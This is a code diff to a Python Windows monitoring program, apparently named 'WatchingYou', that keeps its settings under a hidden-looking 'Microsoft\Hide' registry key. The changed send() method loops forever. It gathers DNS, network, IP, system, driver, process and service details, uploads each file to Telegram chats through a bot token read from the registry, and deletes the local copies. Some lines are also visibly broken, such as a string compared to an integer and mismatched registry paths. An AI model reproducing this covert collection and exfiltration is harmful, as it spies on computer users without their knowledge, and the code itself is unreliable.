@@ -564,35 +564,34 @@ class PCInformation:
         return response
 
     def send(self):
-        def init():
-            bot = telepot.Bot(str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot').read_value('token')))
-            chat_id = str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot').read_value('id'))[0]
+        while (True):
+            if str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\PCInformation').read_value('active')) == 1:
+                bot = telepot.Bot(
+                    str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot').read_value('token')))
+                for id in WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot').read_value('id'):
 
-            data = {
-                "Información del DNS": self.__display_dns(),
-                "Información de la RED": self.__red_info(),
-                "Configuración del IP": self.__ip_config(),
-                "Información del sistema": self.__system_info(),
-                "Información de los controladores": self.__driver_info(),
-                "Programas ejecutandose": self.__taks_list(),
-                "Servicios ejecutandose": self.__service_active()
-            }
-            paths = []
-            for name, value in data.items():
-                path = str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\PCInformation').read_value('path')) + '\\' + name + '.txt'
-                paths.append(path)
-                Util().save_file(path, value)
+                    data = {
+                        "Información del DNS": self.__display_dns(),
+                        "Información de la RED": self.__red_info(),
+                        "Configuración del IP": self.__ip_config(),
+                        "Información del sistema": self.__system_info(),
+                        "Información de los controladores": self.__driver_info(),
+                        "Programas ejecutandose": self.__taks_list(),
+                        "Servicios ejecutandose": self.__service_active()
+                    }
+                    paths = []
+                    for name, value in data.items():
+                        path = str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\PCInformation').read_value(
+                            'path')) + '\\' + name + '.txt'
+                        paths.append(path)
+                        Util().save_file(path, value)
 
-                bot.sendChatAction(chat_id, 'typing')
-                bot.sendDocument(chat_id, open(path, 'rb'), Util().current_time())
-                time.sleep(5)
-                os.remove(path)
+                        bot.sendChatAction(id, 'typing')
+                        bot.sendDocument(id, open(path, 'rb'))
+                        # time.sleep(1)
+                        os.remove(path)
 
-                while (True):
-                    init()
-                    time.sleep(int(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\PCInformation').read_value('interval')))
-
-        init()
+            time.sleep(int(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\PCInformation').read_value('interval')))
 
 
 class WebCam_IA:
@@ -812,7 +811,7 @@ class WatchingYou:
         def webcam_pc_information_reg():
             reg = WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\PCInformation')
             reg.set_value_DWORD('active', 1)
-            reg.set_value_String('interval', '200')
+            reg.set_value_String('interval', 350)
             reg.set_value_String('path', r'C:\Users\Public\temp\watching_you\pc_information')
 
         webcam_pc_information_reg()
@@ -840,7 +839,7 @@ class WatchingYou:
 
 if __name__ == '__main__':
     
-    if WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide').read_value('fullname') == False:
+    if not WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide').read_value('fullname'):
         print('no existe, crear datos en el registro')
         WatchingYou().write_reg_complete_init()
 
@@ -851,13 +850,11 @@ if __name__ == '__main__':
         str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide').read_value('sub_path')),
         str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Screenshot').read_value('path')),
         str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\WebCam').read_value('path')),
-        str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\PCInformation').read_value('path'))
+        str(WinRegistry(r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\PCInformation').read_value('path')),
     ]
     for f in folders:
         Util().delete_folder(f)  # Remove foldes and files // Cache
         Util().create_folder(f)  # Create folders for cache
-
-
 
 
     eel.init('web')     # Nombre de la carpeta
@@ -887,6 +884,8 @@ if __name__ == '__main__':
 
         # vuelve al inicio del software, tambien detener
         WatchingYou().disabled()
+        if Util().is_admin():
+            threading.Thread(target=WebsiteBlock().reset()).start()   # Desbloquear Webs
         # Modificar registro
         return ""
 
@@ -894,6 +893,8 @@ if __name__ == '__main__':
     def start___():  # Inicia todo el proceso
         # se detiene el software confirmado
         WatchingYou().disabled()
+        if Util().is_admin():
+            threading.Thread(target=WebsiteBlock().reset()).start()  # Desbloquear Webs
         return ""
 
     @eel.expose
